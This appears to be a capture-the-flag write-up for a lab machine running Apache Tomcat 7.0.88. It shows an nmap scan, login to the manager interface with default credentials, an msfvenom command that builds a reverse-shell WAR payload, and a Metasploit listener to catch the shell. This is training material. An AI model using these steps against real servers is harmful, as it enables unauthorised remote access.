#Enumeration

The first step is to run an nmap scan to gewt an idea of what services are running on the machine.

```
nmap -sV -sC -Pn --reason --open 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org )
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 4.05% done; ETC: 12:48 (0:00:47 remaining)
Nmap scan report for 10.10.10.95
Host is up, received user-set (0.046s latency).
Not shown: 999 filtered ports
Reason: 999 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

There is only one port open in the top 100, port 8080. The nmap script results (from the -sC flag) reveal that this is running Apache Tomcat 7.0.88.

A bit of internet research will reveal there is a web interface under /manager/html. Further internet research will uncover the default credentials for Apache Tomcat.

We now have access to the web interface. This administative interface has file upload functionality which we can abuse to gain a shell. Under the deploy section, we have the ability to upload a .war file. A suitable payload can be generated using msfvenom:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your IP] LPORT=4444 -f war > ~/Desktop/reverse.war`

We need to create a listener using Metasploit to catch the reverse shell. Within the Metasplot Framework set the following options:

```
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST [Your IP]
set LPORT 4444 (if it's not already set)
exploit
```

Now upload and deploy the .war file and you will get a shell. Both of the flags (user.txt and root.txt) will be in the Desktop folder so no privesc is required!